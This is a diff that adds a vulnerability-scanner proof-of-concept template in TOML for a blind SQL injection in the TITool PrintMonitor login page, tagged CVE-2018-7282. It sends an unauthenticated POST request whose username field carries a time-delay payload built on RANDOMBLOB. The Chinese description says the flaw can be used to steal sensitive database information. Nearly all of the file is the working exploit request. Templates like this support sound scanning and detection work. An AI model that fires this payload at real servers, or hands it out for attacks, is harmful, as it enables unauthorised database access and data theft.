@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "TITool PrintMonitor /login.php 接口 username 参数存在时间盲注漏洞，未认证攻击者可通过 POST 请求注入 AND RANDOMBLOB 延时 SQL 语句，利用时间差判断注入结果，进而窃取数据库敏感信息"
+id = "POC-AVE-2018-0194"
+name = "TITool PrintMonitor Blind SQL Injection PoC"
+severity = "critical"
+tags = ["ave-2018-0194"]
+vuln_id = [
+    "CVE-2018-7282",
+    "AVE-2018-0194",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin') AND 4197=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- nVTH&password=admin&language=en"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
